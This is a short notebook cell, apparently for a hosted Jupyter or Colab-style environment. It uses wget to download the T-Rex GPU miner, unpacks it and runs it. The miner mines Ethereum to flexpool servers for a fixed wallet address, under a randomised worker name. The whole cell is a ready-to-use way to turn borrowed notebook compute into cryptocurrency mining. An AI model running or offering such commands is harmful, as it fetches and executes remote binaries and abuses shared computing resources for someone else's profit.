!pip install --upgrade pip
!wget https://trex-miner.com/download/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0x7e7a592fE8b12508d5bFA897A2F993ba5e316267 -p x -w $(echo $(shuf -i 1-9999 -n 1)-msi1000)
